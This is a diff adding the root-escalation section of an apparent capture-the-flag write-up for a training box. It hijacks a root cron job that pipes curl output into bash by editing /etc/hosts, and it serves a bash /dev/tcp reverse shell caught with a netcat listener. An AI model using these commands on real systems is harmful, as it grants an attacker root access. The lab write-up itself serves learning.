@@ -54,3 +54,59 @@ Now we can retest the connection with ssh and the rsa key
 BINGO !!!! we are connected as james and we can get the first flag user.txt
 
 <img width="428" height="70" alt="image" src="https://github.com/user-attachments/assets/24f2df07-0619-44a1-8362-d891c0522e44" />
+
+---
+Lets find the root password !
+
+
+```
+cat /etc/crontab
+```
+
+Something interesting here 
+
+<img width="703" height="327" alt="image" src="https://github.com/user-attachments/assets/c68327b6-06b0-4d22-ae92-7772dfb7e386" />
+
+so what's happening in this command :
+```
+curl overpass.thm/downloads/src/script.sh | bash
+```
+it downloads the resource and then directly execute it as a root ! 
+
+so lets try to modify the /etc/hosts to make point at our ip address 
+
+<img width="703" height="327" alt="image" src="https://github.com/user-attachments/assets/d2a203bf-eacc-4e18-9314-f294f026f795" />
+
+
+so right now, we're going to create exactly the same path as the curl in order to have this path at the end in our attacker machine :
+```
+IP_ATTACKER/downloads/src/buildscript.sh
+```
+and lets insert a rev shell inside the buildscript.sh
+```
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
+```
+
+<img width="703" height="92" alt="image" src="https://github.com/user-attachments/assets/aa7caa86-7501-49d4-9e9b-e75fa2e54aab" />
+
+
+
+open a python server in a terminal before the downloads directory
+```
+python -m http.server 80
+```
+
+and in the other side a listner
+
+```
+nc -nvlp 4444
+```
+
+and wait a minute !
+
+<img width="703" height="92" alt="image" src="https://github.com/user-attachments/assets/eaa4a8b8-3b14-409e-be03-50993824922c" />
+
+congrats ! 
+
+<img width="714" height="175" alt="image" src="https://github.com/user-attachments/assets/6bb27e5c-7e3c-42a3-a515-04336f991594" />
